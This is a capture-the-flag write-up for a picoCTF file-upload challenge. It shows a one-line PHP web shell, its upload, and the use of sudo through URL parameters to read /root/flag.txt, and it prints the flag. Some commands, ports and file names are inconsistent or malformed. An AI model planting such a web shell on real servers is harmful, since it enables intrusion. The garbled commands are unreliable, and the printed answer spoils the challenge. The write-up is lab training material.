Description:
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.

Step-by-step solution:
1. Understand:
We have a web page where we can upload something, most likely we will upload php file in it. And somehow we have to see in /root directory to get the flag.
2. Launch:
First of all launch instance, and visit the give link in description. 
3. Make file:
We will make a php file that should help us to run some command.Make it using 'nano mypayload' so it will look like this:
<?php system($_GET['mycommand']);?>
and this mycommand variable will help us.
4. Upload file:
Browse the file and upload mypayload file. You will see a message on page that will givw address of the file we uploaded like:
uploads/mypayload.php
We will write it in URL after (http://standard-pizzas.picoctf.net:54208/upload.php) 54208/ and then we will be able to see the uploaded file. It means we can also see root here.
5. Change URL:
In the URL change it like this:
http://standard-pizzas.picoctf.net:58457/uploads/mypayload.php?mycommand=sudo /root /ls
Because we want to see root. You will see falg.txt there so use it: http://standard-pizzas.picoctf.net:58457/uploads/payload.php?mycommand=sudo cat /root/flag.txt
6. Flag:
picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}
